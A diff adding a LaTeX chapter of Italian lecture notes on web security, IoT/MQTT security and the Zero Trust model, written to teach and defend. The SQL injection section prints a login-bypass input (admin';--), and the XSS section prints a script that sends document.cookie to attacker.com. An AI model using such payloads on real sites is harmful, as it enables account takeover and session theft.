@@ -1,0 +1,148 @@
+\chapter{Web and IoT Security \& The Zero Trust Model}
+\thispagestyle{chapterInit}
+\section{Web Security}
+    \subsection{Introduzione}
+        \subsubsection{Il modello \textit{client}/\textit{server}}
+            Il modello \textit{client}/\textit{server} è il modello di comunicazione più diffuso quando si parla di web. Il \textit{server} rappresenta l'astrazione delle risorse di un computer, mentre i \textit{client} che non si curano di come il \textit{server} gestisca la \textbf{richiesta} a patto che quest'ultimo invii una \textbf{risposta}. L'unica cosa che il \textit{client} necessita di sapere è il \textbf{protocollo} di comunicazione, ovvero il contenuto e il formato della richiesta e della risposta per il servizio richiesto.\newline
+            Come anticipato il \textit{server} e il \textit{client} si scambiano dei messaggi, questi nella modalità \textbf{richiesta}-\textbf{risposta} ovvero il \textit{client} inizializza la comunicazione inviando una richiesta al \textit{server} che è sempre in ascolto e risponde con una risposta. Per lavorare bene entrambe le parti devono concordare su un linguaggio comune e devono seguire delle regole, ovvero un \textbf{protocollo}.
+            \paragraph{Il protocollo \texttt{HTTP}} Il protocollo \texttt{HTTP} (\textit{HyperText Transfer Protocol}) è un protocollo "\textit{stateless}" che non conserva informazioni sullo stato della comunicazione, ed lavora al livello applicazione. Questo è alla base del \texttt{WWW} sin dal 1990 ed ha delle caratteristiche fondamentali:\begin{description}
+                \item[\textit{Connectionless}] Quando un \textit{client} esegue una richiesta questa viene aperta una connessione con il \textit{server}, la richiesta viene processata e la connessione viene chiusa. Quando il \textit{server} invia la risposta viene aperta una nuova connessione e così via.
+                \item[\textit{Media Independent}] Il protocollo \texttt{HTTP} non è legato ad un particolare tipo di media, ovvero può inviare qualsiasi tipo di dato.
+                \item[\textit{Stateless}] Come anticipato il protocollo \texttt{HTTP} non mantiene informazioni sullo stato della comunicazione, ovvero non mantiene informazioni sulle richieste precedenti. Quindi quando un \textit{client} esegue una richiesta il \textit{server} non sa nulla delle richieste precedenti.
+            \end{description}
+        \subsubsection{Rendere sicure le applicazioni web}
+            Creare una applicazione web è semplice, ma creare una applicazione web sicura è difficile e noioso. In quanto il web si basa su un modello multi-livello i problemi di sicurezza possono essere presenti ad ogni livello. Di una applicazione devono essere infatti messi in sicurezza: il \textit{database}, il \textit{server}, la applicazione in se ed infine la rete. Questo deve essere fatto in quanto bisogna considerare molti tipi diversi di attacchi come ad esempio: un \textit{malware attacker} che risiede nel computer dell'utente, un \textit{network attacker} che agisce sulla rete o un \textit{web attacker} che agisce direttamente sui \textit{server} (sia web che \textit{database}).
+        \subsubsection{Minacce delle applicazioni web}
+            Come già anticipato le applicazioni web sono soggette a molte minacce possiamo classificarle per il livello e per il luogo dove avvengono.
+            \begin{itemize}
+                \item \underline{\textbf{\textit{Application-Layer}}} \begin{itemize}
+                    \item \texttt{SQL} \textit{Injection}
+                    \item \textit{Cross-Site Scripting} (\texttt{XSS})
+                    \item \textit{Cross-Site Request Forgery} (\texttt{CSRF})
+                    \item \textit{Broken Authentication}
+                    \item \textit{Unvalidated input}
+                \end{itemize}
+                \item \textbf{\textit{Server-Layer}} \begin{itemize}
+                    \item \textit{Denial of Service} (\texttt{DoS})
+                    \item \texttt{OS} \textit{Exploits}
+                \end{itemize}
+                \item \textbf{\textit{Network-Layer}} \begin{itemize}
+                    \item \textit{Packet Sniffing}
+                    \item \textit{Man-in-the-Middle} (\texttt{MitM})
+                    \item \textit{DNS Spoofing}
+                \end{itemize}
+                \item \textbf{\textit{User-Layer}} \begin{itemize}
+                    \item \underline{\textit{Phishing}}
+                    \item \textit{Key-Logging}
+                    \item \textit{Malware}
+                \end{itemize}
+            \end{itemize}
+            Noi ci concentreremo sulle minacce \textit{Application-Layer} ed inoltre sugli attacchi di \textit{Phishing}.
+            \paragraph{Requisiti di una web-app} Solitamente una applicazione web deve soddisfare i seguenti requisiti:\begin{description}
+                \item[\textit{Authentication}] Vuoi sapere con chi stai parlando.
+                \item[\textit{Authorization} (\textit{Access Control})] L'utente può avere accesso solo a quelle risorse alle quali ha diritto.
+                \item[\textit{Confidentiality}] I dati devono essere protetti e mantenuti segreti.
+                \item[\textit{Integrity}] I dati non devono essere modificati nel trasporto.
+                \item[\textit{Non-Repudiation}] L'utente non può negare di aver eseguito una azione.
+            \end{description}
+            \paragraph{Definizione di sicurezza per una web-app} la \textit{Web Application security} è un insieme di \underline{informazioni di} \underline{sicurezza} che gestisce specificamente la \underline{sicurezza di siti web, di applicazioni web e di servizi web}. Ad alto livello la sicurezza delle applicazioni web si basa sul principio di \textbf{sicurezza delle applicazioni} ma si applica specificamente alle applicazioni web.\newline
+            La \textbf{Sicurezza delle applicazioni} è un insieme di misure implementate da una applicazione per \underline{trovare,} \underline{correggere e prevenire vurnerabilità per la sicurezza}.
+    \subsection{\textit{Injection Attacks}}
+        \subsubsection{\texttt{SQL} \textit{injection}}
+            L'\texttt{SQL} \textit{injection} è un attacco che sfrutta le vulnerabilità di un'applicazione web che non controlla correttamente i dati inseriti dall'utente.
+            \paragraph{PoC - Proof of Concept} Supponiamo di avere un'applicazione web che permette di eseguire il login tramite username e password, la query \texttt{SQL} che viene eseguita è la seguente: 
+            \begin{lstlisting}
+SELECT * FROM users WHERE username = '$username' AND password = '$password';\end{lstlisting}
+            Se l'utente inserisce come username \texttt{admin} e come password \texttt{admin} la query diventa:
+            \begin{lstlisting}
+SELECT * FROM users WHERE username = 'admin' AND password = 'admin';\end{lstlisting}
+            Il che è il funzionamento che ci aspettiamo. Supponiamo ora che un utente che non conosce la password dell'utente \texttt{admin} inserisca come nome utente \texttt{admin';--} e come password \texttt{qualunquecosa}. La query diventa:
+            \begin{lstlisting}
+SELECT * FROM users WHERE username = 'admin';--' AND password = 'qualunquecosa';\end{lstlisting}
+            In quanto il \texttt{--} è un commento in \texttt{SQL} la query diventa:
+            \begin{lstlisting}
+SELECT * FROM users WHERE username = 'admin';\end{lstlisting}
+            Quindi l'utente malintenzionato è riuscito ad accedere come \texttt{admin} senza conoscere la password. 
+            \paragraph{Obbiettivi} Gli obbiettivi di chi tenta di eseguire un attacco di \texttt{SQL} \textit{injection} possono essere molteplici, a partire dell'ottenimento di dati sensibili fino ad arrivare all'eliminazione di interi \textit{dataset}.
+            \paragraph{Mitigazioni} Per mitigare gli attacchi di \texttt{SQL} \textit{injection} è necessario fare un \textbf{input sanitization} ovvero controllare e pulire i dati inseriti dall'utente andando a fare l'\textit{escaping} dei caratteri speciali che potrebbero essere inseriti. Inoltre è possibile utilizzare \textbf{prepared statements} ovvero query precompilate che vengono eseguite in modo sicuro. Inoltre dovrebbe essere applicato il principio di \textbf{Least Privilege} ovvero bisogna dare l'accesso minimo necessario all'applicazione per funzionare senza fornire permessi inutili e/o accesso con permessi di amministratore ad una applicazione.
+    \subsection{\textit{Cross-Site Scripting} (\texttt{XSS})}
+        Il \textit{Cross-Site Scripting} (\texttt{XSS}) è un attacco che permette ad un attaccante di eseguire codice \texttt{JavaScript} all'interno di una applicazione web. Questo attacco è possibile quando un'applicazione web permette di inserire codice \texttt{JS} all'interno di un campo di input e questo codice viene poi eseguito da un altro utente.
+        \paragraph{PoC - Proof of Concept} Supponiamo di avere un'applicazione web che permette di inserire un commento all'interno di un post, se un utente inserisce come commento il seguente codice:
+        \begin{lstlisting}
+<script>window.open('http://attacker.com?cookie=' + document.cookie)</script>\end{lstlisting}
+        Allora l'url che si genera è il seguente:
+        \begin{lstlisting}
+http://applicazione.com/post?comment=<script>window.open('http://attacker.com?cookie=' + document.cookie)</script>\end{lstlisting}
+        Se il sito \texttt{applicazione.com} è vulnerabile all'attacco di \texttt{XSS} allora il codice \texttt{JS} viene eseguito e l'attaccante riceve i \textit{cookie} della vittima. Nei \textit{cookie} potrebbero essere presenti informazioni sensibili come ad esempio \texttt{JWT} o \textit{session token}.\footnote{Ne abbiamo discusso nel capitolo \ref{ch:accessControlII} - \nameref{ch:accessControlII}}
+        \paragraph{Funzionamento in 3 step} \begin{itemize}
+            \item L'attaccante invia un messaggio alla vittima contenente un url vulnerabile al quale sono stati aggiunti dei parametri che eseguono codice \texttt{JS}.
+            \item La vittima clicca sul link e se il sito è vulnerabile il codice \texttt{JS} viene eseguito, questo codice potrebbe inviare i \textit{cookie} della vittima ad un server controllato dall'attaccante.
+            \item L'attaccante riceve i \textit{cookie} della vittima e può impersonarla.
+        \end{itemize}
+        \paragraph{Mitigazioni} 
+            Per mitigare gli attacchi di \texttt{XSS} è necessario filtrare tutti i parametri che vengono passati tramite \texttt{HTTP GET} o \texttt{POST} e fare l'\textit{escaping} dei caratteri speciali. La miglior soluzione è comunque quella di definire dei caratteri ammessi tramite \texttt{RegEx} e filtrare i parametri in base a questi ritornando un errore se il parametro non è valido.
+    \subsection{\textit{Access Control Violation}}
+        \subsubsection{Preambolo - perchè l'\texttt{AC} è importante delle web-app}
+            L'\textit{Access Control} (\texttt{AC})\footnote{Come discusso nel capitolo \ref{chap:accessControl} - \nameref{chap:accessControl}} è un aspetto fondamentale per la sicurezza delle applicazioni in generale, ma è particolarmente importante per le applicazioni web. Senza un \texttt{AC} valido possono verificarsi eventi di \textit{data breach} ovvero la perdita di dati sensibili. Vedi ad esempio il caso di \textit{Equifax} nel 2017 dove sono stati rubati i dati di 147 milioni di utenti come: patenti di guida, numeri di previdenza sociale, date di nascita e indirizzi, foto e molto altro. 
+        \subsubsection{\textit{Broken Access Control}}
+            Gli \texttt{AC} in generale devono seguire sempre il principio di "\textit{least privilege}" in questo modo anche se le credenziali di un utente vengono compromesse solo le informazioni a lui legate lo sono, nel caso di \textit{equifax} se fosse stato applicato il principio di \textit{least privilege} il danno sarebbe stato molto minore in quanto solo le informazioni legate a quel utente sarebbero state compromesse, e non l'intero \textit{database} di una compagnia da 147 milioni di utenti.
+\section{IoT Security}
+    \subsection{Il modello \textit{publish}/\textit{subscribe} }
+        Dato che il modello \textit{client}/\textit{server} prevede un \textit{client} inizializzi la comunicazione, rendendo questo un modello del tipo \texttt{pull} per i dispositivi \texttt{IoT} che spesso hanno poche risorse e quindi non possono inizializzare la comunicazione. Per questo motivo si è sviluppato il modello \textit{publish}/\textit{subscribe} che permette ai dispositivi di pubblicare i dati raccolti ed ai \textit{server} di sottoscriversi a questi dati. Questo modello basato sul principio \textit{many-to-many} permette di avere una comunicazione \texttt{push} e non \texttt{pull} come nel modello \textit{client}/\textit{server}. Inoltre sia lo \textbf{spazio} che il \textbf{tempo} sono \textit{de-coupled} ovvero non è più necessario che tutti le parti conoscano tutti i messaggi, solo le parti interessate ricevono i messaggi (\textit{space decoupling}), inoltre non è necessario che una parte partecipi attivamente allo stesso tempo in quanto i messaggi sono inviati tramite una terza parte (\textit{time decoupling}). Come ulteriore aggiunta il modello \textit{publish}/\textit{subscribe} permette di avere sia una comunicazione basata sul \texttt{push} che sul \texttt{pull}.
+        \subsubsection{Pattern di comunicazione} 
+            Per funzionare il modello sfrutta tre entità:
+                \begin{description}
+                    \item[\textit{Publisher}] Colui che pubblica i dati sotto forma di eventi
+                    \item[\textit{Subscriber}] Colui che si sottoscrive agli eventi
+                    \item[\textit{Event Notification System} \texttt{ENS}] Il sistema che gestisce la comunicazione tra \textit{Publisher} e \textit{Subscriber}
+                \end{description}
+            Gli \textbf{eventi} rappresentano un informazione strutturata che segue un \textit{event schema} definito a priori ed statico. Nello schema sono definiti un insieme di attributi ognuno di quali costituito da un nome e da un tipo di dato.
+        \subsubsection{Sottoscrizioni}
+            Le sottoscrizioni sono il meccanismo tramite il quale un particolare \textit{subscriber} notifica al \texttt{ENS} l'interesse verso un particolare evento. Le sottoscrizioni sono delle costanti espresse sul \textit{event schema}. Una volta registrata il \texttt{ENS} notificherà un evento $e$ al \textit{subscriber} $x$ se e solo se i valori definiti nell'evento $e$ sono compatibili con i valori definiti in una delle sottoscrizioni $s$ di $x$.\newline
+            Le sottoscrizioni possono essere di vario tipo: \textit{Topic-based}, \textit{Content-based}, \dots
+            \paragraph{Sottoscrizioni \textit{Topic-based}} Le sottoscrizioni \textit{Topic-based} si basano sul \textit{topic} dell'evento. È vero che sui \textit{server} spesso le informazioni non sono strutturate ma ad ogni evento viene associato un "\textit{tag}" corrispondente all'identificatore del \textit{topic} nel quale è stato pubblicato. Un \textit{subscriber} può rilasciare una sottoscrizione su uno o più \textit{topic} specifici e riceverà solo gli eventi pubblicati su quei \textit{topic}.
+            \paragraph{Sottoscrizioni \textit{Hierarchy-based}} Le sottoscrizioni \textit{Hierarchy-based} sono simili alle \textit{Topic-based} ma a differenza di queste ultime i \textit{topic} sono organizzati seguendo una struttura gerarchica e nel momento in cui un \textit{subscriber} si sottoscrive ad un \textit{topic} riceverà tutti gli eventi pubblicati su quel \textit{topic} e su tutti i \textit{sotto-topic} figli di quel \textit{topic}.\footnote{I \textit{sotto-topic} sono a loro volta dei \textit{topic} veri e propri, a meno del livello di gerarchia questi sono identici ai \textit{topic} principali e quindi ci si può sottoscrivere anche a questi come se fossero \textit{topic} principali.}
+    \subsection{\texttt{MQTT}}
+        \texttt{MQTT} (\textit{Message Queue Telemetry Transport}) è un protocollo di messaggistica leggero e scalabile che si basa sul modello \textit{publish}/\textit{subscribe}. Questo protocollo è stato progettato per essere utilizzato in ambienti con limitate risorse o reti a piccola-banda/alta latenza come ad esempio le reti \texttt{IoT}. \texttt{MQTT} è un protocollo \textit{stateless} che minimizza l'uso della banda e richiede pochissime risorse lato \textit{hardware} e \textit{software}. 
+        \paragraph{Funzionamento}
+            \begin{itemize}
+                \item Il \textbf{publisher} pubblica un messaggio su uno o più \textit{topic} all'interno del \textit{broker}.
+                \item Il \textbf{subscriber} si sottoscrive ad uno o più \textit{topic} all'interno del \textit{broker} e riceve tutti i messaggi inviati dal \textit{publisher} su quel \textit{topic}.
+                \item Il \textbf{broker} è il server che gestisce la comunicazione tra \textit{publisher} e \textit{subscriber}.
+                \item Il \textbf{topic} consiste in uno o più livelli di gerarchia separati da uno \textit{slash} (\texttt{/}).
+            \end{itemize}
+        \paragraph{Sicurezza ?} \texttt{MQTT} è un protocollo molto leggero e scalabile ma non è molto sicuro, da specifiche è possibile passare un \textit{username} ed una \textit{password} all'interno di un pacchetto \texttt{MQTT} e la comunicazione può essere cifrata tramite \texttt{TLS}, ma questa deve essere gestita indipendentemente da questa. Inoltre \texttt{MQTT} per rimanere leggero non implementa della sicurezza a livello di \textit{broker} e quindi è necessario implementare delle misure di sicurezza aggiuntive.
+        \paragraph{\texttt{MQTT} e credenziali} \texttt{MQTT} permette di passare le credenziali all'interno del pacchetto \texttt{MQTT} ma queste sono in chiaro e quindi possono essere intercettate da una qualsiasi persona all'interno della rete. Inoltre il pacchetto di risposta contiene direttamente se le credenziali sono corrette o meno e quindi un attaccante può facilmente ottenere le credenziali di un utente.
+
+\section{Il modello \textit{Zero Trust}}
+    Il modello \textit{zero trust} prevede che nessuna entità all'interno di una rete debba essere considerata attendibile e che ogni entità debba essere verificata prima di poter accedere ad una risorsa. Il modello prevede che ogni sistema aziendale sia considerato una risorsa, e quindi a rischio, inoltre ogni comunicazione deve essere effettuata in maniera sicura indipendentemente dalla rete. Inoltre gli accessi alle risorse individuali è garantito solo per-connessione, ovvero per ogni connessione l'utente deve autenticarsi con una autenticazione dinamica e stretta. Le policy per le quali un utente può accedere sono determinate da proprietà sia dell'utente che in base a proprietà di ambiente.
+    \subsection{I 6 pilastri del modello \textit{zero trust}}
+        Il modello \textit{zero trust} fondato sull'identificazione delle risorse, degli utenti e dei \textit{workflow} prevede l'identificazione di un \textit{workflow} candidato e basandosi su \textit{assets} e \textit{user} coinvolti sviluppa una serie di \textit{access policy} per quel \textit{workflow}. Inoltre monitora e sviluppa le \textit{policies}.
+        \subsubsection{Pilastro 1 - \textit{Users}}
+            Il primo pilastro del modello \textit{zero trust} è l'identificazione e la continua autenticazione degli utenti, sia che questi siano fidati che meno.\newline
+            Questo pilastro comprende l'uso di tecnologie quali l'identità, la gestione degli accessi e l'autenticazione multi-fattore\footnote{Come discusso nella sezione \ref{sec:mfa} - \nameref{sec:mfa}}. Infine è necessario che le informazioni e interazioni degli utenti siano protette e monitorate, per questo sono importanti tecnologie come \texttt{TLS}\footnote{Vedi il capitolo \ref{ch:PIK-TLS} - \nameref{ch:PIK-TLS}} e \texttt{SSL}.
+        \subsubsection{Pilastro 2 - \textit{Devices}}
+            Il secondo pilastro sono i dispositivi, è importante monitorate in tempo reale la sicurezza di questi. In particolare un "registro di device" per tenere traccia di tutti i dispositivi connessi alla rete e/o dei quali ci si fida. Esistono soluzioni se una policy del tipo "\textit{bring your device}" ovvero permettere ai dipendenti di portare i propri dispositivi personali in azienda, in questo caso è necessario che i dispositivi siano monitorati e che siano conformi alle policy aziendali, questo magari grazie a soluzioni di \textit{Mobile Device Manager}.
+        \subsubsection{Pilastro 3 - \textit{Network}}
+            Nel modello \textit{zero trust} l'infrastruttura tradizionale che prevede un \textit{firewall} ed un perimetro non è più sufficiente. In quanto chi risiede all'interno del perimetro del \textit{firewall} si muove molto più vicino ai dati allora è necessario che questi siano micro-segmentati per aumentare la protezione ed il controllo. Inoltre è di criticale importanza un controllo gerarchico e basato su privilegi dell'accesso alla rete, inoltre i flussi interni ed esterni devono essere monitorati e controllati. Bisogna prevenire "movimenti laterali" ovvero il movimento di un attaccante all'interno della rete. Infine le decisioni di accesso alla rete non devono essere prese staticamente ma dinamicamente in base a variabili come il contesto, la situazione e al traffico.
+        \subsubsection{Pilastro 4 - \textit{Applications}}
+            Anche l'\textit{application layer} costituito da micro-servizi e macchine virtuali deve essere centralizzato e protetto. Bisogna essere in grado di identificare e controllare le tecnologie usate nello \textit{stack} in modo da poter prendere decisioni più accurate e sicure.\newline
+            L'autenticazione a più fattori in questo pilastro è fondamentale, questa accoppiata ad un controllo di accesso basato su \textit{policy} appropriate ed efficaci permette di proteggere le applicazioni e i dati.
+        \subsubsection{Pilastro 5 - \textit{Automation}}
+            L'automazione è un aspetto fondamentale del modello \textit{zero trust} in quanto permette di ridurre il rischio di errore umano e di velocizzare le operazioni per il controllo e la gestione della sicurezza della rete.\newline
+            vengono istituiti degli \textit{Security Operation Centers} \texttt{SOCs} atti alla creazione di strumenti per la gestione delle informazioni di sicurezza, per la gestione degli eventi, e per lo studio del comportamento di utenti e entità. Sono stati sviluppati degli strumenti detti \textit{Security Orchestration} che connettono questi strumenti e ne permettono la gestione centralizzata.
+        \subsubsection{Pilastro 6 - \textit{Analytics}}
+            L'analisi dei dati è un aspetto fondamentale del modello \textit{zero trust} in quanto non è possibile combattere una minaccia che non è possibile vedere o comprendere. Risulta quindi cruciale fare leva su strumenti quali: \begin{enumerate}
+                \item \textit{Security Information Management} 
+                \item \textit{Advanced Security Analytics Platforms}
+                \item \textit{Security User Behavior Analytics}
+                \item ed altri strumenti di analisi dei dati che permettano agli esperti di osservare in tempo reale il comportamento degli utenti e delle entità all'interno della rete. Ciò in modo da orientare difese più efficaci e mirate.
+            \end{enumerate}
+    \subsection{Stabilire la "fiducia" in un modello senza fiducia}
+        Come stabiliamo che un utente o un dispositivo è attendibile in un modello \textit{zero trust} ?\newline
+        La fiducia viene stabilita in base alle esigenze organizzative ed al focus che si vuole dare alla sicurezza. In ambienti dove il modello è applicato la fiducia viene stabilita in base principalmente a tre fattori: \begin{enumerate}
+            \item \textit{User} - L'identità dell'utente e le sue credenziali
+            \item \textit{Device} - Il dispositivo da cui l'utente si connette
+            \item \textit{Application} - L'applicazione alla quale l'utente vuole accedere
+        \end{enumerate}
+        Da questi tre il "motore di fiducia" determina un punteggio di fiducia dal quale si basano le \textit{policies} per l'accesso alle risorse. Una risorsa più sensibile richiederà un punteggio di fiducia più alto rispetto ad una risorsa meno sensibile.
